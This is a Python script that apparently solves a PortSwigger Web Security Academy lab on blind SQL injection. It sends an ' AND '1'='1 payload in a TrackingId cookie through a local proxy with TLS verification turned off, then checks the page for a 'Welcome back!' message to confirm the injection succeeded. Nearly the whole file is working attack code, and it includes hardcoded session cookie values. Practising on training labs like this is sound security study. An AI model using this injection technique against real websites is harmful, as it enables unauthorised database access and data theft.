import requests
from bs4 import BeautifulSoup

def sql_injection_checker(r):
    html_content = r.content
    soup= BeautifulSoup(html_content,"html.parser")
    menue=soup.find('section',{'class':'top-links'})
    text_to_find="Welcome back!"

    for i in menue:
       if(i.text==text_to_find):
            print("SQL Injection Successfull")
            break







def sql_Inject(url):

    query = r"'+AND+'1'='1 "
    proxy_servers = {
        'http': '127.0.0.1:8080',
        'https': '127.0.0.1:8080',
    }
    header={
        "Cookie": "TrackingId=PrPwVaUElmBWxWgq"+query+"; session=MrmdeivfZnFxgBP0eQc7BfZWh1p6qdq5",
"User-Agent": "Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0",
"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
"Accept-Language": "en-US,en;q=0.5",
"Accept-Encoding": "gzip, deflate",
"Referer": "https://0a4000b1045dd92bc0640e2000a8009a.web-security-academy.net/filter?category=Lifestyle",
"Upgrade-Insecure-Requests": "1",
"Sec-Fetch-Dest": "document",
"Sec-Fetch-Mode": "navigate",
"Sec-Fetch-Site": "same-origin",
"Sec-Fetch-User": "?1",
"Te": "trailers",
"Connection": "close"
        
    }
    r = requests.get(url,proxies=proxy_servers,headers=header,verify=False)
    sql_injection_checker(r)

url = "https://0a4000b1045dd92bc0640e2000a8009a.web-security-academy.net/filter?category=Lifestyle"

sql_Inject(url)




